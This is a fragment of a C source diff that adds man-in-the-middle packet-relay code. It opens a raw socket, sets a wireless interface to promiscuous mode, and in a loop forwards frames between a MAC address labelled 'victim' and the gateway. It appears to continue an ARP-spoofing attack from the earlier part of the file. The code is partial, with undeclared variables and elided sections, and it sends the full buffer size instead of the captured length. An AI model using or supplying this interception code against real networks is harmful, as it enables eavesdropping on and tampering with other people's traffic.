@@ -114,3 +114,58 @@ while (1) {
         }
     }
 }
+
+
+
+
+
+///////////
+// ...
+
+// Create a raw socket in promiscuous mode
+sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+if (sockfd < 0) {
+    perror("Failed to create socket");
+    exit(EXIT_FAILURE);
+}
+
+// Set the socket to promiscuous mode
+struct ifreq ifr;
+strncpy(ifr.ifr_name, "wlp3s0", IFNAMSIZ); // Replace with your interface name
+if (ioctl(sockfd, SIOCGIFFLAGS, &ifr) < 0) {
+    perror("Failed to get interface flags");
+    exit(EXIT_FAILURE);
+}
+ifr.ifr_flags |= IFF_PROMISC;
+if (ioctl(sockfd, SIOCSIFFLAGS, &ifr) < 0) {
+    perror("Failed to set interface to promiscuous mode");
+    exit(EXIT_FAILURE);
+}
+
+while (1) {
+    // Capture a packet
+    if (recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, NULL, NULL) < 0) {
+        perror("Failed to receive packet");
+        continue;
+    }
+
+    // Check if the packet is from the victim or to the gateway
+    struct ether_header* ethHeader = (struct ether_header*)buffer;
+    if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0 && memcmp(ethHeader->ether_dhost, gatewayMAC, ETH_ALEN) == 0) {
+        // Forward the packet to the gateway
+        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&gateway_addr, sizeof(gateway_addr)) < 0) {
+            perror("Failed to send packet");
+            continue;
+        }
+    }
+    // Check if the packet is from the gateway or to the victim
+    else if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0 && memcmp(ethHeader->ether_dhost, victimMAC, ETH_ALEN) == 0) {
+        // Forward the packet to the victim
+        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&victim_addr, sizeof(victim_addr)) < 0) {
+            perror("Failed to send packet");
+            continue;
+        }
+    }
+}
+
+// ...
